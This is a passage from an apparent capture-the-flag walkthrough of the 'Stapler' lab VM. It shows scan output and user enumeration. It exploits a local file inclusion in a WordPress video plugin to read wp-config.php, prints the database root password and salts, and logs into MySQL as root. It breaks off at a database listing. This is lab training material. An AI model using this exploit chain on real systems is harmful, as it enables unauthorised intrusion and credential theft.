<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.138
</span><span class='line'>+ Target Port: 12380
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>dave<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: Soemthing doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t look right here
</span><span class='line'>+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/admin112233/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/blogblog/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET <span class="p">&amp;</span>ldquo<span class="p">;</span>robots.txt<span class="p">&amp;</span>rdquo<span class="p">;</span> contains <span class="m">2</span> entries which should be manually viewed.
</span><span class='line'>+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-ob_mode<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: 1
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
</span></code></pre></td></tr></table></div></figure></p>

<p>From the nikto scan, we found that WEB server on port 12380 is a HTTPS service and there are three hidden directories <code>/admin112233</code>, <code>/blogblog</code> and <code>/phpmyadmin</code>.</p>

<p>so I checked them one by one, and 1st one is <code>/admin112233</code>, but this is a XSS hook page :(</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/admin112233/&quot;</span>&gt;https://10.1.1.138:12380/admin112233/&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;mwwhahahah&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;noscript&gt;Give yourself a cookie! Javascript didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t <span class="nv">run</span> <span class="o">=)</span>&lt;/noscript&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span>&gt;window.alert<span class="o">(</span><span class="s2">&quot;This could of been a BeEF-XSS hook ;)&quot;</span><span class="o">)</span><span class="p">;</span>window.location<span class="o">=</span><span class="s2">&quot;http://www.xss-payloads.com/&quot;</span><span class="p">;</span>&lt;/script&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>2nd one is <code>/blogblog</code>, and it&rsquo;s using <code>WordPress CMS</code>.</p>

<p>so next, I run <code>wpscan</code> and found one plugin which is vulnerable to <a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> We found <span class="m">4</span> plugins:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Name: advanced-video-embed-embed-videos-or-playlists - v1.0
</span><span class='line'> <span class="p">|</span>  Latest version: 1.0 <span class="o">(</span>up to date<span class="o">)</span>
</span><span class='line'> <span class="p">|</span>  Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Readme: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt&lt;/a&gt;
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Directory listing is enabled: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also I use <code>wpscan</code> to enumerate available users and got the following result:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login   <span class="p">|</span> Name            <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> john    <span class="p">|</span> John Smith      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> elly    <span class="p">|</span> Elly Jones      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> peter   <span class="p">|</span> Peter Parker    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> barry   <span class="p">|</span> Barry Atkins    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> heather <span class="p">|</span> Heather Neville <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">6</span>  <span class="p">|</span> garry   <span class="p">|</span> garry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">7</span>  <span class="p">|</span> harry   <span class="p">|</span> harry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">8</span>  <span class="p">|</span> scott   <span class="p">|</span> scott           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">9</span>  <span class="p">|</span> kathy   <span class="p">|</span> kathy           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim     <span class="p">|</span> tim             <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span></code></pre></td></tr></table></div></figure></p>

<p>By exploiting the Local File Inclusion vulnerability, <code>https://10.1.1.138:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php</code></p>

<p><img class="left" src="/downloads/stapler/1.png"></p>

<p>Then, back to home page and check the frontpage by right clicking and choose <code>Inspect Element (Q)</code>. Then find the thumbnail file location which is <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg</code> in this case.</p>

<p><img class="left" src="/downloads/stapler/2.png"></p>

<p>Then I use <code>curl</code> to download the thumbnail file and save it to my attacking machine.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg&lt;/a&gt; &gt; 1.jpeg
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'><span class="m">100</span>  <span class="m">3042</span>  <span class="m">100</span>  <span class="m">3042</span>    <span class="m">0</span>     <span class="m">0</span>   <span class="m">7509</span>      <span class="m">0</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>  7529
</span></code></pre></td></tr></table></div></figure></p>

<p>Then checking the file <code>1.jepg</code> which actually is the <code>wp-config.php</code> file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# strings 1.jpeg
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'> * The base configurations of the WordPress.
</span><span class='line'> * This file has the following configurations: MySQL settings, Table Prefix,
</span><span class='line'> * Secret Keys, and ABSPATH. You can find more information by visiting
</span><span class='line'> * <span class="o">{</span>@link &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://codex.wordpress.org/Editing_wp-config.php&quot;</span>&gt;https://codex.wordpress.org/Editing_wp-config.php&lt;/a&gt; Editing wp-config.php<span class="o">}</span>
</span><span class='line'> * Codex page. You can get the MySQL settings from your web host.
</span><span class='line'> * This file is used by the wp-config.php creation script during the
</span><span class='line'> * installation. You don<span class="p">&amp;</span>rsquo<span class="p">;</span>t have to use the web site, you can just copy this file
</span><span class='line'> * to <span class="p">&amp;</span>ldquo<span class="p">;</span>wp-config.php<span class="p">&amp;</span>rdquo<span class="p">;</span> and fill in the values.
</span><span class='line'> * @package WordPress
</span><span class='line'>// &lt;strong&gt; MySQL settings - You can get this info from your web host &lt;/strong&gt; //
</span><span class='line'>/&lt;strong&gt; The name of the database <span class="k">for</span> WordPress */
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_NAME<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/strong&gt; MySQL database username &lt;em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_USER<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/** MySQL database password &lt;/em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_PASSWORD<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>plbkac<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;strong&gt; MySQL hostname */
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_HOST<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>localhost<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/strong&gt; Database Charset to use in creating database tables. &lt;em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_CHARSET<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>utf8mb4<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/** The Database Collate type. Don<span class="p">&amp;</span>rsquo<span class="p">;</span>t change this <span class="k">if</span> in doubt. &lt;/em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_COLLATE<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;strong&gt;#@+
</span><span class='line'> * Authentication Unique Keys and Salts.
</span><span class='line'> * Change these to different unique phrases!
</span><span class='line'> * You can generate these using the <span class="o">{</span>@link &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://api.wordpress.org/secret-key/1.1/salt/&quot;</span>&gt;https://api.wordpress.org/secret-key/1.1/salt/&lt;/a&gt; WordPress.org secret-key service<span class="o">}</span>
</span><span class='line'> * You can change these at any point in <span class="nb">time </span>to invalidate all existing cookies. This will force all users to have to log in again.
</span><span class='line'> * @since 2.6.0
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>AUTH_KEY<span class="p">&amp;</span>rsquo<span class="p">;</span>,         <span class="p">&amp;</span>lsquo<span class="p">;</span>V <span class="nv">5p</span><span class="o">=[</span>.Vds8~SX<span class="p">;</span>&gt;t<span class="o">)</span>++Tt57U6<span class="o">{</span>Xe&lt;code&gt;T<span class="p">|</span>oW^eQ!mHr <span class="o">}]</span><span class="p">&amp;</span>gt<span class="p">;</span>9RX07W<span class="p">&amp;</span>lt<span class="p">;</span>sZ,I~&lt;/code&gt;6Y5-T:<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>SECURE_AUTH_KEY<span class="p">&amp;</span>rsquo<span class="p">;</span>,  <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nv">vJZq</span><span class="o">=</span>p.Ug,<span class="o">]</span>:<span class="p">&amp;</span>lt<span class="p">;</span>-P#A<span class="p">|</span>k-+:<span class="p">;</span>JzV8&lt;em&gt;pZ<span class="p">|</span>K/U&lt;/em&gt;J<span class="o">][</span>Nyvs+<span class="o">}</span><span class="p">&amp;</span>amp<span class="p">;</span>!/#&gt;4#K7eFP5-av&lt;code&gt;n<span class="o">)</span>2<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>LOGGED_IN_KEY<span class="s1">&#39;,    &#39;</span>ql-Vfg<span class="o">[</span>?v6<span class="o">{</span>ZR*+O<span class="o">)</span><span class="p">|</span>Hf OpPWYfKX0Jmpl8zU<span class="p">&amp;</span>lt<span class="p">;</span>cr.wm?<span class="p">|</span>jqZH:YMv<span class="p">;</span>zu@tM7P:4o<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>NONCE_KEY<span class="s1">&#39;,        &#39;</span>j<span class="p">|</span>V8J.~n<span class="o">}</span>R2,mlU%?C8o2<span class="o">[</span>~6Vo1<span class="o">{</span>Gt+4mykbYH<span class="p">;</span>HDAIj9TE?QQI!VW<span class="o">]]</span>D&lt;/code&gt;3i73xO<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>AUTH_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,        <span class="p">&amp;</span>lsquo<span class="p">;</span>I<span class="o">{</span>gDlDs&lt;code&gt;Z@.+/AdyzYw4%+<span class="p">&amp;</span>lt<span class="p">;</span>WsO-LDBHT<span class="o">}</span><span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span>!<span class="o">||</span>Xrf@1E6jJNV<span class="o">={</span>p1?yMKYec*OI<span class="s1">$&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>SECURE_AUTH_SALT<span class="s1">&#39;, &#39;</span>.HJmx^zb<span class="o">]</span><span class="p">;</span>5P<span class="o">}</span>hM-uJ%^+9<span class="o">=</span>0SBQEh<span class="o">[[</span>*<span class="p">&amp;</span>gt<span class="p">;</span><span class="c">#z+p&amp;gt;nVi10&lt;/code&gt;XOUq (Zml~op3SG4OG_D&amp;rsquo;);</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>LOGGED_IN_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,   <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>Zz!<span class="o">)</span>%R7/w37+:9L#.<span class="o">=</span>hL:cyeMM2kTx<span class="p">&amp;</span>amp<span class="p">;</span>_nP4<span class="o">{</span>D<span class="o">}</span><span class="nv">n</span><span class="o">=</span><span class="nv">y</span><span class="o">=</span>FQt%zJw&gt;c<span class="o">[</span>a+<span class="p">;</span>ppCzIkt<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>NONCE_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,       <span class="p">&amp;</span>lsquo<span class="p">;</span>tb<span class="o">(}</span>BfgB7l!rhDVm<span class="o">{</span>eK6&lt;sup&gt;MSN&lt;/sup&gt;-<span class="p">|</span>o<span class="o">]</span>S<span class="o">]]</span>axl4TE_y+Fi5I-RxN/9xeTsK<span class="o">]</span><span class="c">#ga_9:hJ&amp;rsquo;);</span>
</span><span class='line'>/&lt;/strong&gt;#@-&lt;em&gt;/
</span><span class='line'> * WordPress Database Table prefix.
</span><span class='line'> * You can have multiple installations in one database <span class="k">if</span> you give each a unique
</span><span class='line'> * prefix. Only numbers, letters, and underscores please!
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>wp_<span class="p">&amp;</span>rsquo<span class="p">;;</span>
</span><span class='line'> * For developers: WordPress debugging mode.
</span><span class='line'> * Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
</span><span class='line'> * It is strongly recommended that plugin and theme developers use WP_DEBUG
</span><span class='line'> * in their development environments.
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>WP_DEBUG<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/em&gt; That<span class="p">&amp;</span>rsquo<span class="p">;</span>s all, stop editing! Happy blogging. &lt;em&gt;/
</span><span class='line'>/** Absolute path to the WordPress directory. &lt;/em&gt;/
</span><span class='line'><span class="k">if</span> <span class="o">(</span> !defined<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>ABSPATH<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="o">)</span>
</span><span class='line'>    define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>ABSPATH<span class="p">&amp;</span>rsquo<span class="p">;</span>, dirname<span class="o">(</span>&lt;strong&gt;FILE&lt;/strong&gt;<span class="o">)</span> . <span class="p">&amp;</span>lsquo<span class="p">;</span>/<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;em&gt;* Sets up WordPress vars and included files. &lt;/em&gt;/
</span><span class='line'>require_once<span class="o">(</span>ABSPATH . <span class="p">&amp;</span>lsquo<span class="p">;</span>wp-settings.php<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>WP_HTTP_BLOCK_EXTERNAL<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now I got the MySQL database ROOT login password and the DB name:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DB_USER: root
</span><span class='line'>DB_PASS: plbkac
</span><span class='line'>DB_NAME: wordpress
</span></code></pre></td></tr></table></div></figure></p>

<p>When exploiting the Local File Inclusion vulnerability, I found the full path disclosure as well when a non-exist file name is given.</p>

<p>The full path is <font color="red"><code>/var/www/https/blogblog/</code></font></p>

<p><img class="left" src="/downloads/stapler/3.png"></p>

<p>Due to obtain the MySQL root and password, I was connected to target MySQL server with ROOT priviledge.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# mysql -h 10.1.1.138 -u root -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 8514
</span><span class='line'>Server version: 5.7.13-0ubuntu0.16.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Copyright <span class="p">&amp;</span>copy<span class="p">;</span> 2000, 2016, Oracle and/or its affiliates. All rights reserved.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Type <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nb">help</span><span class="p">;&amp;</span>rsquo<span class="p">;</span> or <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\h</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">for</span> help. Type <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\c</span><span class="p">&amp;</span>rsquo<span class="p">;</span> to clear the current input statement.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt; show databases<span class="p">;</span>
